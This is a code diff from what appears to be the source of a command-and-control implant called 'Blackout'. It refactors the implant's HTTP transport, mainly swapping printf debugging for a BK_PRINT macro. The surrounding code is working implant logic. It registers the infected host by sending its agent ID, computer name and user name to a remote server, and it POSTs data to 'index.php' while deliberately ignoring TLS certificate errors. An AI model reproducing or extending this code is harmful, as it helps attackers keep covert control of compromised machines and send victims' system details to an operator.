@@ -37,7 +37,6 @@ FUNC BOOL TransportInit()
     // PackageAddPad( Package, Blackout.Config.AES.Key, 32 );
     // PackageAddPad( Package, Blackout.Config.AES.IV,  16 );
     
-
     PackageAddInt32(   Package, Instance()->Session.AgentId       );
     PackageAddString(  Package, Instance()->System.ComputerName   );
     PackageAddString(  Package, Instance()->System.UserName       );
@@ -64,14 +63,14 @@ FUNC BOOL TransportInit()
 
     if ( PackageTransmit( Package, &Data, &Length ) )
     {
-        Instance()->Win32.printf("TRANSMITTED PACKAGE!\n");
+        BK_PRINT("TRANSMITTED PACKAGE!\n");
 
         if ( Data )
         {
-            Instance()->Win32.printf( "Agent => %x : %x\n", ( UINT32 ) C_DEF( Data ), ( UINT32 ) Instance()->Session.AgentId );
+            BK_PRINT( "Agent => %x : %x\n", ( UINT32 ) C_DEF( Data ), ( UINT32 ) Instance()->Session.AgentId );
             if ( ( UINT32 ) Instance()->Session.AgentId == ( UINT32 ) C_DEF( Data ) )
             {
-                Instance()->Win32.printf("CONNECTED!\n");
+                BK_PRINT("CONNECTED!\n");
                 Instance()->Session.Connected = TRUE;
                 Success = TRUE;
             }
@@ -102,19 +101,19 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = FALSE;
 
-    hSession = Instance()->Win32.WinHttpOpen( Instance()->Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    hSession = Instance()->Win32.WinHttpOpen( Transport().Http.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
-        Instance()->Win32.printf( "WinHttpOpen: Failed => %d\n", NtGetLastError() );
+        BK_PRINT( "[HTTP] WinHttpOpen: Failed => %d\n", NtGetLastError() );
         Successful = FALSE;
         goto LEAVE;
     }
 
-    hConnect = Instance()->Win32.WinHttpConnect( hSession, Instance()->Transport.Host, Instance()->Transport.Port, 0 );
-    Instance()->Win32.printf( "> WinHttpConnect=> %d\n", NtGetLastError() );
+    hConnect = Instance()->Win32.WinHttpConnect( hSession, Transport().Http.Host, Transport().Http.Port, 0 );
+    BK_PRINT( "[HTTP] > WinHttpConnect=> %d\n", NtGetLastError() );
     if ( ! hConnect )
     {
-        Instance()->Win32.printf( "WinHttpConnect: Failed => %d\n", NtGetLastError() );
+        BK_PRINT( "[HTTP] WinHttpConnect: Failed => %d\n", NtGetLastError() );
         Successful = FALSE;
         goto LEAVE;
     }
@@ -122,20 +121,20 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
-    if ( Instance()->Transport.Secure ){
+    if ( Transport().Http.Secure ){
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
     hRequest = Instance()->Win32.WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
-    Instance()->Win32.printf( "> WinHttpOpenRequest=> %d\n", NtGetLastError() );
+    BK_PRINT( "[HTTP] > WinHttpOpenRequest=> %d\n", NtGetLastError() );
 
     if ( ! hRequest )
     {
-        Instance()->Win32.printf( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() );
+        BK_PRINT( "[HTTP] WinHttpOpenRequest: Failed => %d\n", NtGetLastError() );
         return FALSE;
     }
 
-    if ( Instance()->Transport.Secure )
+    if ( Transport().Http.Secure )
     {
         HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -144,15 +143,12 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
 
         if ( ! Instance()->Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
-            Instance()->Win32.printf( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            BK_PRINT( "[HTTP] WinHttpSetOption: Failed => %d\n", NtGetLastError() );
         }else{
-            Instance()->Win32.printf( "> WinHttpSetOption => %d\n", NtGetLastError() );
+            BK_PRINT( "[HTTP] > WinHttpSetOption => %d\n", NtGetLastError() );
 
         }
     }
-
-    // Send our data
-    // PRINT_HEX(Data, Size)
 
     if ( Instance()->Win32.WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
     {
@@ -165,7 +161,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
                 if ( ! Successful || BufRead == 0 )
                 {
                     if ( ! Successful )
-                        Instance()->Win32.printf( "WinHttpReadData: Failed (%d)\n", NtGetLastError() );
+                        BK_PRINT( "[HTTP] WinHttpReadData: Failed (%d)\n", NtGetLastError() );
                     break;
                 }
 
@@ -195,7 +191,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
         if ( NtGetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
             Instance()->Session.Connected = FALSE;
         }else {
-            Instance()->Win32.printf("WinHttpSendRequest: Failed => %d\n", NtGetLastError());
+            BK_PRINT("[HTTP] WinHttpSendRequest: Failed => %d\n", NtGetLastError());
         }
         Successful = FALSE;
         goto LEAVE;
